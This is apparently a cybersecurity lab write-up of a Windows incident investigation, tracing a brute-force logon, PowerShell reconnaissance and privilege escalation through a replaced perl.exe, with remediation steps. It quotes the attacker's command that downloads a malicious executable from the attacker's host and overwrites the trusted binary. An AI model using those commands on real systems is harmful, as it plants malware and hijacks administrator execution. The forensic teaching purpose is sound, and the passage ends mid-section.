# Lab 05: Incident Investigation and Log Analysis

## 🎯 Lab Overview

This lab demonstrates advanced incident response and digital forensics capabilities through comprehensive Windows security log analysis and post-breach investigation. The hands-on experience covers brute-force attack detection, privilege escalation analysis, execution hijacking identification, and complete attack timeline reconstruction—critical skills for SOC analysts and incident responders.

**Completion Date:** As per curriculum  
**Environment:** Windows Server, PowerShell, Event Viewer  
**Incident Type:** Brute Force Attack → Privilege Escalation → Execution Hijacking  
**Attack Source:** Kali Linux system (192.168.56.101)  
**Compromised Account:** JSmith (standard user)  
**Target Account:** Administrator (privilege escalation objective)  
**Attack Vector:** DLL Hijacking via perl.exe replacement  
**Detection Method:** Windows Event Log Analysis (Security.evtx)

---

## 📋 Table of Contents

- [Objectives](#objectives)
- [Technologies & Tools Used](#technologies--tools-used)
- [Part 1: Initial Vector of Compromise](#part-1-initial-vector-of-compromise)
  - [Log Collection & Analysis](#log-collection--analysis)
  - [Brute Force Attack Investigation](#brute-force-attack-investigation)
  - [Forensic Findings](#forensic-findings)
  - [Executive Summary - Initial Breach](#executive-summary---initial-breach)
- [Part 2: Post-Breach Behavior Analysis](#part-2-post-breach-behavior-analysis)
  - [Attacker Command Analysis](#attacker-command-analysis)
  - [Privilege Escalation Investigation](#privilege-escalation-investigation)
  - [Execution Hijacking Technique](#execution-hijacking-technique)
- [Attack Chain Reconstruction](#attack-chain-reconstruction)
- [Skills Demonstrated](#skills-demonstrated)
- [Real-World Applications](#real-world-applications)
- [Key Learnings](#key-learnings)

---

## 🎓 Objectives

- Collect and analyze Windows Security Event Logs for incident investigation
- Identify brute-force authentication attacks from security log patterns
- Extract critical forensic artifacts (attacker IP, hostname, timestamp, compromised account)
- Analyze PowerShell command history for post-exploitation activities
- Identify privilege escalation techniques and execution hijacking methods
- Reconstruct complete attack timeline from initial access to privilege escalation
- Develop incident response recommendations and remediation strategies
- Document findings in executive summary format for stakeholders

---

## 🛠️ Technologies & Tools Used

| Category | Tools/Technologies |
|----------|-------------------|
| **Operating System** | Windows Server 2019/2016 |
| **Log Analysis** | Windows Event Viewer, Excel |
| **Log Source** | Security.evtx (Windows Security Event Log) |
| **Scripting** | PowerShell (attacker's tool) |
| **Forensic Tools** | Event Viewer, PowerShell History Analysis |
| **Attack Platform** | Kali Linux (attacker system) |
| **Attack Tools** | Hydra/similar brute force tool, listdlls.exe, PowerShell |
| **Target Process** | perl.exe (Strawberry Perl) |
| **Attack Technique** | MITRE ATT&CK T1574.002 (DLL Side-Loading/Hijacking) |

---

## 🔬 Part 1: Initial Vector of Compromise

### Log Collection & Analysis

**Objective:** Extract and analyze Windows Security Event Logs to identify initial breach indicators.

---

#### Step 1: Security Log Export

**Tool:** Windows Event Viewer (eventvwr.msc)

**Procedure:**
1. Open Event Viewer → Windows Logs → Security
2. Right-click on "Security" log
3. Select "Save All Events As..."
4. Export format: CSV (Comma-Separated Values)
5. Filename: `securitylog.csv`

**Screenshot Reference:** Figure 1 - Security log export interface

**Log Location (Native):** `C:\Windows\System32\winevt\Logs\Security.evtx`

**Why CSV Export:**
- ✓ Easy analysis in Excel/spreadsheet applications
- ✓ Filtering and sorting capabilities
- ✓ Searchable text format
- ✓ Compatible with log analysis tools (Splunk, ELK)
- ✓ Shareable format for collaboration

**File Size Considerations:**
- Default Security log: 20 MB (approx. 10,000-50,000 events)
- Production environment: Can be hundreds of MBs
- Retention: Typically 90 days or more for compliance

---

#### Step 2: Log Analysis in Excel

**Methodology:** Import CSV into Excel for structured analysis

**Screenshot Reference:** Figure 2 - Security log imported to Excel

**Excel Analysis Capabilities:**
```
Columns Available:
├─ Event ID (4624, 4625, 4672, etc.)
├─ Level (Information, Warning, Error)
├─ Date and Time
├─ Source (Security-Auditing)
├─ Task Category (Logon, Account Logon, etc.)
├─ Keywords (Audit Success, Audit Failure)
├─ Computer Name
├─ User Name
└─ Additional Details (IP address, logon type, etc.)
```

**Key Event IDs for Security Investigation:**

| Event ID | Description | Significance |
|----------|-------------|--------------|
| **4624** | Successful logon | Legitimate access or compromised account |
| **4625** | Failed logon | Brute force attempts, credential stuffing |
| **4648** | Logon using explicit credentials | Lateral movement, RunAs usage |
| **4672** | Special privileges assigned | Administrator access granted |
| **4720** | User account created | Persistence mechanism |
| **4732** | User added to security group | Privilege escalation |
| **4688** | Process created | Command execution tracking |
| **4698** | Scheduled task created | Persistence technique |

**Analysis Workflow:**
1. **Filter for failed logons (4625)** → Identify brute force patterns
2. **Look for successful logon (4624)** → Confirm breach
3. **Check special privileges (4672)** → Detect privilege escalation
4. **Review process creation (4688)** → Identify attacker commands

---

### Brute Force Attack Investigation

#### Forensic Question 1: Attacker Hostname

**Question:** What is the name of the computer that engaged in the brute force attack?

**Finding:** **Kali**

**Evidence Location:** Security log, Computer Name field in Event 4625 entries

**Screenshot Reference:** Figure 3 - Computer name "Kali" in failed logon attempts

**Analysis:**
```
Event ID: 4625 (Failed Logon)
Computer Name: Kali
Interpretation: Attacker using Kali Linux penetration testing distribution
```

**Significance:**
- **Kali Linux:** Purpose-built penetration testing operating system
- **Tool Repository:** Contains 600+ security tools including:
  - Hydra (password cracking)
  - Metasploit Framework
  - Nmap, Wireshark, Burp Suite
  - John the Ripper, Hashcat
- **Attacker Profile:** Indicates technical sophistication
- **Naming:** Attacker didn't mask hostname (OPSEC failure)

**Red Flag:** Kali Linux system attempting authentication to production server = immediate investigation trigger

---

#### Forensic Question 2: Attacker IP Address

**Question:** What is the IP address of the computer that engaged in the brute force attack?

**Finding:** **192.168.56.101**

**Evidence Location:** Security log, Source Network Address field

**Screenshot Reference:** Figure 4 - IP address in failed authentication events

**Event Details:**
```
Event ID: 4625
Source Network Address: 192.168.56.101
Workstation Name: Kali
Account Name: [Various attempted usernames]
Failure Reason: Unknown user name or bad password
```

**Network Intelligence:**

**IP Analysis:**
- **Subnet:** 192.168.56.0/24 (RFC 1918 private address space)
- **Range:** Typically VirtualBox host-only network
- **Implication:** Internal threat or compromised internal system

**Threat Assessment:**
```
External Attacker: Unlikely (private IP)
Internal Threat: Possible (insider attack)
Compromised System: Most likely (pivot from another breach)
Lab Environment: Confirmed (VirtualBox network)
```

**Network Positioning:**
- Same network segment as target
- Direct Layer 2 connectivity
- No firewall/IDS between attacker and target (likely)

**Incident Response Actions:**
- Block 192.168.56.101 at firewall/host firewall
- Isolate system for forensic analysis
- Check for lateral movement from this IP
- Review network traffic logs for this source

---

#### Forensic Question 3: Compromised Account

**Question:** What is the name of the account that the attacker breached?

**Finding:** **JSmith**

**Evidence Location:** Security log, successful logon (Event 4624) after multiple failures

**Screenshot Reference:** Figure 5 - JSmith account successfully authenticated

**Event Correlation:**
```
Timeline Analysis:
├─ Multiple Event 4625 (Failed logons) for various accounts
├─ Increasing frequency of attempts
├─ Password spray or dictionary attack pattern
└─ Event 4624 (Successful logon) - Account: JSmith
```

**Account Profile:**
```
Username: JSmith
Full Name: John Smith (likely)
Account Type: Standard User (non-administrative)
Permissions: Limited (no admin rights initially)
```

**Why JSmith Was Targeted:**
1. **Weak Password:** Likely common password (Password1, Summer2021, etc.)
2. **Predictable Username:** Standard naming convention (FirstInitial + LastName)
3. **No MFA:** Multi-factor authentication not enabled
4. **Account Lockout:** Not configured or threshold not met

**Breach Significance:**
- **Initial Access Obtained:** Attacker now has valid credentials
- **Lateral Movement Risk:** Can pivot to other systems
- **Privilege Escalation Target:** Standard user → Administrator
- **Persistence Opportunity:** Can create scheduled tasks, registry entries

---

#### Forensic Question 4: Attack Start Time

**Question:** At what approximate time did the attack start?

**Finding:** **9/7/2021 10:04:47 AM**

**Evidence Location:** First Event 4625 timestamp in security log

**Screenshot Reference:** Figure 6 - Initial failed authentication timestamp

**Timeline Precision:**
```
Attack Initiation: 9/7/2021 10:04:47 AM
First Failed Logon: Event 4625
Pattern: Multiple rapid failed attempts following
Success: [Later timestamp after brute forcing]
```

**Temporal Analysis:**

**Attack Window:**
- **Start:** 10:04:47 AM
- **Duration:** Unknown (requires analysis of successful logon time)
- **Day of Week:** Tuesday (business day)
- **Time of Day:** Mid-morning (workday hours)

**Timing Significance:**
- **Business Hours Attack:** Less likely to trigger alerts
- **User Activity:** JSmith may be actively logged in elsewhere
- **SOC Awareness:** Daytime attacks blend with legitimate activity

**Investigation Implications:**
```
Questions to Answer:
├─ How long until successful breach?
├─ Was account lockout triggered?
├─ Did anyone notice unusual activity?
├─ Were there concurrent successful logons (real user)?
└─ When did attacker start post-exploitation?
```

**Best Practice:** Correlate with:
- Firewall logs (initial connection from 192.168.56.101)
- IDS/IPS alerts
- Failed logon alerts from SIEM
- User's legitimate activity (VPN logs, workstation logon)

---

### Executive Summary - Initial Breach

#### Incident Overview

**Classification:** Unauthorized Access via Brute Force Authentication Attack  
**Severity:** **HIGH**  
**Attack Date:** September 7, 2021  
**Initial Detection:** Log Analysis (post-incident investigation)  
**Compromised Account:** JSmith (standard user)  
**Attacker System:** Kali Linux (192.168.56.101)

---

#### Attack Narrative

**Phase 1: Initial Reconnaissance**

The threat actor, operating from a Kali Linux system (IP: 192.168.56.101), initiated a **brute force authentication attack** against the Windows server at approximately **10:04:47 AM on September 7, 2021**.

**Attack Methodology:**
```
Technique: Password spraying / Dictionary attack
Tool: Likely Hydra, Medusa, or custom script
Target: Windows Authentication (SMB/RDP)
Strategy: Multiple password attempts against multiple accounts
```

**Evidence:**
- Hundreds of Event ID 4625 (Failed Logon) entries
- Source: 192.168.56.101
- Workstation: Kali
- Pattern: Rapid sequential failed attempts

---

**Phase 2: Successful Compromise**

After numerous failed authentication attempts, the attacker successfully breached the **JSmith** account.

**Root Cause:**
```
Primary Factor: Weak password (easily cracked/guessed)
Contributing Factors:
├─ No account lockout policy configured
├─ No multi-factor authentication (MFA)
├─ Predictable username format
├─ No brute-force detection/alerting
└─ No IP-based access restrictions
```

**Evidence:**
- Event ID 4624 (Successful Logon)
- Account Name: JSmith
- Source: 192.168.56.101
- Logon Type: 3 (Network logon) or 10 (Remote Interactive)

---

**Phase 3: Establishing Foothold**

Upon gaining access to JSmith's standard user account, the attacker immediately began **reconnaissance activities** to understand the system environment and identify paths to privilege escalation.

**Reconnaissance Commands Executed:**
```powershell
Get-Process
# Purpose: Enumerate running processes, identify security tools

Get-WmiObject -Class Win32_Product  
# Purpose: Enumerate installed software, find vulnerable applications

cd Desktop; .\listdlls.exe
# Purpose: Analyze DLL loading for hijacking opportunities
```

**Intelligence Gathering:**
- Active processes and their privileges
- Installed software and versions
- Security monitoring tools (EDR, AV)
- Trusted executables running with elevated privileges
- System architecture and configuration

---

**Phase 4: Privilege Escalation Planning**

The attacker identified a **privilege escalation opportunity** through **execution hijacking** (also known as DLL hijacking or binary replacement).

**Target Identified:** `perl.exe` (Strawberry Perl interpreter)

**Reconnaissance Process:**
```powershell
# Step 1: List all DLLs and find trusted processes
.\listdlls.exe

# Step 2: Focus on perl.exe specifically  
.\listdlls.exe -r perl

# Purpose: Identify perl.exe location and DLL dependencies
# Result: C:\Strawberry\perl\bin\perl.exe identified
```

**Why perl.exe Was Chosen:**
1. **Legitimate Tool:** Trusted by system and users
2. **Admin Usage:** Likely executed by administrators for scripting
3. **Location:** C:\Strawberry\perl\bin\ (writable by standard users - misconfiguration)
4. **No Code Signing:** No digital signature verification
5. **Execution Context:** When admin runs perl script, malicious binary executes with admin rights

---

**Phase 5: Malicious Payload Deployment**

The attacker downloaded a **malicious perl.exe** from their command-and-control server and replaced the legitimate binary.

**Attack Commands:**
```powershell
# Download malicious payload
Invoke-WebRequest http://192.168.56.101:8000/per10.exe -OutFile ./perl.exe

# Replace legitimate perl.exe with malicious version
cp perl.exe C:\Strawberry\perl\bin\perl.exe
```

**Attack Flow:**
```
1. Attacker's Web Server: http://192.168.56.101:8000/per10.exe
   └─ Serves malicious executable (likely reverse shell/backdoor)

2. Download to Compromised System: 
   └─ JSmith's profile directory (Desktop or Downloads)

3. File Replacement:
   └─ Copy malicious perl.exe → C:\Strawberry\perl\bin\perl.exe
   └─ Original perl.exe overwritten (evidence destroyed)
```

**Malicious Payload Analysis (Hypothetical):**
```
File: per10.exe (renamed to perl.exe)
Type: Windows PE executable
Capabilities (likely):
├─ Reverse shell to 192.168.56.101
├─ Credential dumping (mimikatz functionality)
├─ Keylogging
├─ Screenshot capture
└─ Lateral movement capabilities
```

---

**Phase 6: Privilege Escalation Trigger (Waiting)**

The attacker now waits for an **administrator to execute a Perl script**, which will inadvertently run the malicious binary with elevated privileges.

**Execution Hijacking Scenario:**
```
1. Administrator logs in to server
2. Administrator runs: perl.exe important_script.pl
3. System executes: C:\Strawberry\perl\bin\perl.exe (MALICIOUS)
4. Malicious binary runs with administrator privileges
5. Attacker gains admin-level access to system
6. Full system compromise achieved
```

**Attack Success Conditions:**
- Administrator uses Perl for scripting (common in IT environments)
- No application whitelisting (would block unsigned binary)
- No file integrity monitoring (would detect replacement)
- No endpoint detection and response (EDR) alerting on suspicious binary execution

---

#### Attack Classification

**MITRE ATT&CK Framework Mapping:**

| Tactic | Technique | ID | Description |
|--------|-----------|----|----|
| **Initial Access** | Valid Accounts | T1078 | Brute force to obtain JSmith credentials |
| **Execution** | Command and Scripting Interpreter | T1059.001 | PowerShell for reconnaissance and file operations |
| **Persistence** | Hijack Execution Flow | T1574.002 | DLL Side-Loading / Binary Replacement |
| **Privilege Escalation** | Hijack Execution Flow | T1574.002 | Execution hijacking via perl.exe replacement |
| **Defense Evasion** | Masquerading | T1036.005 | Malicious binary disguised as legitimate perl.exe |
| **Discovery** | System Information Discovery | T1082 | Get-Process, Get-WmiObject enumeration |
| **Command and Control** | Web Protocols | T1071.001 | Invoke-WebRequest to download payload |

---

#### Impact Assessment

**Current Impact (Confirmed):**
- ✅ JSmith account compromised (credential theft)
- ✅ Unauthorized access to server
- ✅ Malicious binary planted in system
- ✅ Trust relationship exploited (perl.exe)

**Potential Impact (Risk):**
- ⚠️ **Administrator compromise** (when perl.exe executed)
- ⚠️ **Domain Admin access** (if server is domain-joined)
- ⚠️ **Lateral movement** to other systems
- ⚠️ **Data exfiltration** (sensitive files, databases)
- ⚠️ **Ransomware deployment** (with admin access)
- ⚠️ **Persistent backdoor** (scheduled tasks, services)

**Business Impact:**
- Confidentiality: HIGH (data access, credential theft)
- Integrity: HIGH (binary replacement, file modification)
- Availability: MEDIUM (potential ransomware/DoS)
- Compliance: VIOLATION (unauthorized access, data breach)

---

#### Root Cause Analysis

**Primary Vulnerabilities:**

1. **Weak Password Policy - CRITICAL**
   - No complexity requirements enforced
   - No password length minimum (sufficient)
   - Password likely in common wordlists
   - No password rotation policy

2. **No Account Lockout - CRITICAL**
   - Unlimited failed logon attempts allowed
   - Brute force attacks unimpeded
   - No threshold for temporary lockout

3. **Missing Multi-Factor Authentication (MFA) - HIGH**
   - Single factor (password only) authentication
   - No second factor (SMS, authenticator app, hardware token)
   - Remote access without additional verification

4. **Excessive File System Permissions - HIGH**
   - Standard user can modify C:\Strawberry\perl\bin\
   - System executables writable by non-admin users
   - No principle of least privilege

5. **No Application Whitelisting - MEDIUM**
   - Unsigned binaries can execute
   - No AppLocker or Windows Defender Application Control
   - File integrity not monitored

6. **Insufficient Logging & Monitoring - MEDIUM**
   - No real-time brute force detection
   - No SIEM alerting on failed logons
   - Security logs not actively monitored

---

#### Immediate Response Actions (CRITICAL - 0-2 Hours)

**1. Containment:**
```powershell
# Disable compromised account immediately
Disable-ADUser -Identity JSmith
# Or local account: net user JSmith /active:no

# Block attacker IP at firewall
New-NetFirewallRule -DisplayName "Block Kali Attack" -Direction Inbound -RemoteAddress 192.168.56.101 -Action Block

# Isolate affected server from network (if possible)
# Disconnect network cable or disable network adapter
```

**2. Eradication:**
```powershell
# Remove malicious perl.exe
Remove-Item "C:\Strawberry\perl\bin\perl.exe" -Force

# Restore legitimate perl.exe from backup or reinstall
# Download from: https://strawberryperl.com/

# Kill any running perl.exe processes
Get-Process perl -ErrorAction SilentlyContinue | Stop-Process -Force

# Check for persistence mechanisms
Get-ScheduledTask | Where-Object {$_.Author -like "*JSmith*"}
Get-WmiObject Win32_Service | Where-Object {$_.StartName -like "*JSmith*"}
```

**3. Evidence Preservation:**
```powershell
# Export complete security log
wevtutil epl Security C:\forensics\Security.evtx

# Export PowerShell history
Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" C:\forensics\

# Create memory dump for analysis
# Use DumpIt, FTK Imager, or WinPmem

# Document timeline and actions taken
```

**4. Notification:**
- Security team
- IT management  
- Legal/Compliance (depending on data exposure)
- Affected user (JSmith)

---

#### Short-Term Remediation (24-48 Hours)

**1. Enforce Strong Password Policy:**
```
Group Policy Configuration:
├─ Minimum password length: 14 characters
├─ Complexity requirements: Enabled
├─ Password history: 24 passwords remembered
├─ Maximum password age: 90 days
├─ Minimum password age: 1 day
└─ Lockout threshold: 5 failed attempts
   └─ Lockout duration: 30 minutes
   └─ Reset lockout counter: 30 minutes
```

**PowerShell Implementation:**
```powershell
# Set password policy
net accounts /minpwlen:14 /maxpwage:90 /minpwage:1 /uniquepw:24

# Set account lockout policy
net accounts /lockoutthreshold:5 /lockoutduration:30 /lockoutwindow:30
```

**2. Deploy Multi-Factor Authentication:**
```
Solutions:
├─ Microsoft Authenticator (if Azure AD)
├─ Duo Security
├─ Google Authenticator
├─ YubiKey (hardware tokens)
└─ Windows Hello for Business
```

**3. Fix File System Permissions:**
```powershell
# Restrict C:\Strawberry\perl\bin\ to Administrators only
$acl = Get-Acl "C:\Strawberry\perl\bin"
$acl.SetAccessRuleProtection($true, $false) # Remove inheritance
$adminRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Administrators","FullControl","ContainerInherit,ObjectInherit","None","Allow")
$acl.SetAccessRule($adminRule)
Set-Acl "C:\Strawberry\perl\bin" $acl

# Verify
Get-Acl "C:\Strawberry\perl\bin" | Format-List
```

**4. Force Password Reset:**
```powershell
# Reset all user passwords
Get-ADUser -Filter * | Set-ADUser -ChangePasswordAtLogon $true

# Or specific user
Set-ADUser -Identity JSmith -ChangePasswordAtLogon $true
```

---

#### Medium-Term Remediation (1-4 Weeks)

**1. Deploy Endpoint Detection and Response (EDR):**
```
Solutions:
├─ CrowdStrike Falcon
├─ Microsoft Defender for Endpoint
├─ SentinelOne
├─ Carbon Black
└─ Cortex XDR

Capabilities:
├─ Behavioral detection (execution hijacking)
├─ Binary reputation analysis
├─ Memory injection detection
├─ Lateral movement alerting
└─ Automated response (isolate, kill process)
```

**2. Implement Application Whitelisting:**
```powershell
# Enable AppLocker (Windows Pro/Enterprise)
# Create rules to allow only signed executables

# Example: Block unsigned executables
New-AppLockerPolicy -RuleType Executable -RuleName "Block Unsigned" -Action Deny -Condition (New-AppLockerFileCondition -Publisher *)

# Or use Windows Defender Application Control (WDAC)
# For more granular control
```

**3. Deploy SIEM and Configure Alerts:**
```
SIEM Solutions:
├─ Splunk Enterprise Security
├─ Microsoft Sentinel
├─ IBM QRadar
├─ ELK Stack (Elasticsearch, Logstash, Kibana)
└─ Graylog

Alert Rules to Create:
├─ 10+ failed logons in 5 minutes → Email security team
├─ Successful logon after failed attempts → Investigate
├─ New scheduled task created → Alert
├─ Process execution from temp directories → Block
├─ Outbound connection to non-standard ports → Alert
└─ File modification in System32 or Program Files → Investigate
```

**4. File Integrity Monitoring:**
```
Solutions:
├─ OSSEC (open source)
├─ Tripwire
├─ AIDE (Advanced Intrusion Detection Environment)
└─ Windows System Resource Manager

Monitor:
├─ C:\Windows\System32\
├─ C:\Program Files\
├─ C:\Strawberry\perl\bin\
└─ Any directory with executables
```

**5. Network Segmentation:**
```
Implement:
├─ Separate VLANs for servers, workstations, guests
├─ Firewall rules between segments
├─ Require VPN + MFA for remote access
├─ Jump box for administrative access (no direct RDP)
└─ Micro-segmentation for critical assets
```

---

#### Long-Term Security Strategy (1-6 Months)

**1. Security Awareness Training:**
- Password hygiene (passphrases, password managers)
- Phishing recognition
- Social engineering tactics
- Incident reporting procedures
- Quarterly refresher training

**2. Penetration Testing:**
- Annual external penetration test
- Quarterly internal vulnerability assessments
- Red team exercises (simulate advanced threats)
- Purple team collaboration (red + blue team)

**3. Zero Trust Architecture:**
- Verify explicitly (never trust, always verify)
- Least privilege access
- Assume breach mindset
- Micro-segmentation
- Continuous monitoring

**4. Incident Response Plan:**
- Documented procedures
- Regular tabletop exercises
- Defined roles and responsibilities
- Communication templates
- Post-incident review process

**5. Compliance Program:**
- Regular audits (SOC 2, ISO 27001, PCI-DSS)
- Policy review and updates
- Risk assessments
- Third-party risk management
- Continuous compliance monitoring

---

#### Success Metrics

**Immediate (Week 1):**
- ✅ Compromised account disabled
- ✅ Malicious binary removed
- ✅ Attacker IP blocked
- ✅ All passwords reset
- ✅ Account lockout policy configured

**Short-Term (Month 1):**
- ✅ MFA deployed for all accounts
- ✅ File system permissions hardened
- ✅ EDR deployed on all endpoints
- ✅ SIEM collecting logs with basic alerts

**Medium-Term (Month 3):**
- ✅ Zero brute force attacks successful
- ✅ Application whitelisting enforcing
- ✅ File integrity monitoring operational
- ✅ Security awareness training completed

**Long-Term (Month 6):**
- ✅ Penetration test passed (no critical findings)
- ✅ Zero unauthorized privilege escalations
- ✅ Incident response plan tested and validated
- ✅ Compliance audit passed

---

#### Lessons Learned

**What Went Wrong:**
1. **Password weakness** allowed brute force success
2. **No account lockout** enabled unlimited attempts
3. **No MFA** provided single point of failure
4. **Excessive permissions** enabled binary replacement
5. **No monitoring** delayed detection by days/weeks

**What Worked:**
1. **Logging enabled** provided complete attack reconstruction
2. **Forensic capability** identified all attack stages
3. **Process documentation** enabled thorough investigation

**Key Takeaways:**
- ✓ Defense-in-depth prevents single vulnerability from full compromise
- ✓ Logging is critical for post-incident investigation
- ✓ File integrity monitoring detects tampering
- ✓ Least privilege limits blast radius
- ✓ EDR provides real-time threat detection

---

## 🔬 Part 2: Post-Breach Behavior Analysis

### Attacker Command Analysis

**Objective:** Examine attacker's reconnaissance and privilege escalation activities through PowerShell command history.

---

#### Forensic Question 1: Attacker Commands Executed

**Question:** What are 3 different commands the attacker ran?

**Findings:**

**Command 1: Process Enumeration**
```powershell
Get-Process
```

**Screenshot Reference:** Figure 7 - Get-Process command output

**Purpose:**
- Enumerate all running processes
- Identify active security tools (antivirus, EDR)
- Find high-privilege processes
- Discover potential injection targets

**Information Revealed:**
```
Process enumeration provides:
├─ Process Names (explorer.exe, svchost.exe, etc.)
├─ Process IDs (PID)
├─ CPU and Memory usage
├─ Company name (identifies security products)
└─ Process owner (identifies privilege level)
```

**Attacker's Objective:**
```
Security Reconnaissance:
├─ Is antivirus running? (MsMpEng.exe = Windows Defender)
├─ Is EDR present? (SenseCE.exe = Microsoft Defender ATP)
├─ What processes run as SYSTEM?
├─ Which processes might trust unsigned DLLs?
└─ Can I inject code into a high-privilege process?
```

**Defensive Detection:**
- Monitor PowerShell for enumeration commands
- Alert on Get-Process, Get-Service, Get-WmiObject usage by non-admin
- Behavioral analysis (unusual command sequences)

---

**Command 2: Software Inventory**
```powershell
Get-WmiObject -Class Win32_Product
```

**Screenshot Reference:** Figure 8 - Software enumeration command

**Purpose:**
- Enumerate all installed software
- Identify vulnerable applications
- Find software with known exploits (CVEs)
- Discover privilege escalation opportunities

**Information Revealed:**
```
Win32_Product class returns:
├─ Software Name
├─ Version Number
├─ Vendor
├─ Install Date
├─ Install Location
└─ IdentifyingNumber (GUID)
```

**Example Output:**
```
Name                    : Strawberry Perl
Version                 : 5.32.1.1
Vendor                  : Strawberry Perl Project
InstallLocation         : C:\Strawberry\
```

**Attacker's Intelligence Gathering:**
```
Questions Answered:
├─ What software is outdated? (exploit database lookup)
├─ What tools can I abuse? (Perl, Python, compilers)
├─ Are there vulnerable services? (unpatched software)
├─ What software runs with privileges? (services)
└─ Can I hijack executables? (writable directories)
```

**Why This Matters:**
- **Vulnerability Research:** Match versions to CVE database
- **Tool Discovery:** Find legitimate tools to abuse (LOLBins - Living Off The Land Binaries)
- **Attack Planning:** Identify best path to privilege escalation

---

**Command 3: Process Analysis Tool Execution**
```powershell
cd Desktop
.\listdlls.exe
```

**Screenshot Reference:** Figure 8 - Opening listdlls.exe from Desktop

**Purpose:**
- Analyze DLL loading in processes
- Identify DLL hijacking opportunities
- Find legitimate tools running with high privileges

**What is listdlls.exe:**
```
Tool: Sysinternals ListDLLs
Vendor: Microsoft (Sysinternals Suite)
Legitimate Use: System administration, debugging
Functionality: Lists all DLLs loaded into processes

Output provides:
├─ Process name and PID
├─ Every DLL loaded by that process
├─ DLL path (identifies load order)
├─ DLL version
└─ Company name
```

**Attacker's Usage:**
```powershell
# General enumeration
.\listdlls.exe

# Target specific process (perl.exe in this case)
.\listdlls.exe -r perl
```

**Why Attackers Use This:**
- **DLL Search Order Hijacking:** Identify processes that load DLLs from writable locations
- **Process Hollowing:** Find injectable processes
- **Trusted Executables:** Discover signed binaries to trojanize

---

#### Command Purpose Deep Dive

**Forensic Question 2:** What do you think the purpose of one of these commands might be?

**Analysis of Get-Process:**

**Command:**
```powershell
Get-Process
```

**Screenshot Reference:** Figure 7 - Process enumeration

**Detailed Purpose:**

**1. Security Product Identification:**
```
Antivirus Processes:
├─ MsMpEng.exe (Windows Defender)
├─ avp.exe (Kaspersky)
├─ MBAMService.exe (Malwarebytes)
├─ SentinelAgent.exe (SentinelOne)
└─ csagent.exe (CrowdStrike)

If detected → Attacker adjusts tactics
If absent → Attacker proceeds confidently
```

**2. Privilege Identification:**
```powershell
# Processes running as SYSTEM have highest privileges
Get-Process -IncludeUserName | Where-Object {$_.UserName -like "*SYSTEM*"}

Targets for privilege escalation:
├─ Services (run as SYSTEM)
├─ Scheduled tasks (potentially SYSTEM)
├─ System processes (winlogon.exe, lsass.exe)
└─ Trusted installers (msiexec.exe)
```

**3. Process Injection Targets:**
```
Long-running, trusted processes:
├─ explorer.exe (user's desktop shell)
├─ svchost.exe (Windows services host)
├─ RuntimeBroker.exe (Windows Store apps)
└─ sihost.exe (Shell Infrastructure Host)

Injection → Stealth & persistence
```

**4. Active Security Monitoring:**
```
If EDR present:
├─ Attacker knows they're being watched
├─ May use anti-forensic techniques
├─ Attempts to disable or evade EDR
├─ Changes tactics to avoid detection
```

**Real-World Significance:**
- First thing any penetration tester or attacker does
- Situational awareness before further exploitation
- Determines risk level of continued activity
- Shapes attack methodology

---

#### Target Process Identification

**Forensic Question 3:** What specific process did the attacker seem to take an interest in?

**Finding:** **listdlls.exe** (initially), then **perl.exe** (ultimately)

**Screenshot Reference:** Figure 9 - Attacker analyzing listdlls.exe

---

**Phase 1: Tool Discovery (listdlls.exe)**

**What is listdlls.exe:**
```
Name: ListDLLs
Developer: Microsoft Sysinternals (Mark Russinovich)
Purpose: Legitimate system administration tool
Functionality: Display DLL loaded into processes
Size: ~50 KB
Signed: Yes (Microsoft)
Common Location: Administrator's toolkit, Desktop
```

**Why Attacker Interested:**
- **Reconnaissance Tool:** Perfect for finding DLL hijacking opportunities
- **Legitimate Binary:** Won't trigger antivirus (signed by Microsoft)
- **Available:** Already on the system (IT admin's toolkit)
- **Capabilities:** Reveals process internals

**Attacker's Plan (Hypothetical Alternative):**
```
Option A: Hijack listdlls.exe
├─ Replace legitimate listdlls.exe with malicious version
├─ Admin runs: .\listdlls.exe
├─ Malicious binary executes with admin privileges
└─ Game over

Option B: Use listdlls.exe as intended (chosen)
├─ Run listdlls.exe to find OTHER hijacking opportunities
├─ Identify perl.exe as better target
├─ Proceed with perl.exe hijacking
└─ More reliable exploitation path
```

**Attacker Chose Option B** because:
- listdlls.exe may not be frequently run by admins
- perl.exe more likely to be executed in normal IT operations
- Perl scripts common in automation and IT tasks

---

**Phase 2: Ultimate Target (perl.exe)**

**Final Target Identified:**
```
Process: perl.exe
Full Path: C:\Strawberry\perl\bin\perl.exe
Software: Strawberry Perl (Windows Perl distribution)
Version: 5.32.1.1 (example)
Purpose: Perl script interpreter
Execution Context: User running Perl scripts
```

**Why perl.exe Was Perfect Target:**

**1. Trust Factor:**
```
✓ Legitimate software (Strawberry Perl Project)
✓ Used by IT for automation scripts
✓ Administrators regularly execute Perl scripts
✓ Not suspicious when running
```

**2. Privilege Context:**
```
Scenario:
├─ Admin logs in to server
├─ Admin runs: perl.exe backup_script.pl
├─ perl.exe executes with admin's privileges
└─ If perl.exe is malicious → Instant admin access
```

**3. File System Vulnerability:**
```
Location: C:\Strawberry\perl\bin\perl.exe
Permissions: Writable by standard users (MISCONFIGURATION)

Attacker as JSmith (standard user):
└─ Can replace perl.exe with malicious binary
   └─ Admin executes "perl.exe" later
      └─ Malicious code runs as admin
         └─ Privilege escalation complete
```

**4. Reconnaissance Command:**
```powershell
.\listdlls.exe -r perl
```

**Output (Hypothetical):**
```
perl.exe pid: 1234
  C:\Strawberry\perl\bin\perl.exe
  C:\Windows\System32\ntdll.dll
  C:\Windows\System32\kernel32.dll
  C:\Strawberry\perl\bin\perl532.dll
  ...

Analysis:
├─ perl.exe loads from C:\Strawberry\perl\bin\
├─ DLLs loaded from both System32 and Strawberry directories
├─ Opportunity: Replace perl.exe entirely (binary hijacking)
└─ Alternative: DLL hijacking (place malicious perl532.dll)
```

---

### Privilege Escalation Investigation

#### Independent Examination - Execution Hijacking

**Forensic Question 1:** What application did the attacker use to set a trap for the administrative user?

**Finding:** **perl.exe (Strawberry Perl interpreter)**

**Evidence Location:** PowerShell command history

**Screenshot Reference:** Figure 10 - Attacker targeting perl.exe

**Command Evidence:**
```powershell
.\listdlls.exe -r perl
```

**Command Breakdown:**
- `.\listdlls.exe` - Execute ListDLLs tool
- `-r` - Filter results (recursive/regex search)
- `perl` - Search for processes matching "perl"

**Purpose:**
- Identify exact path to perl.exe
- Analyze DLL dependencies
- Confirm writable location
- Validate as viable target

**Why This Command Matters:**
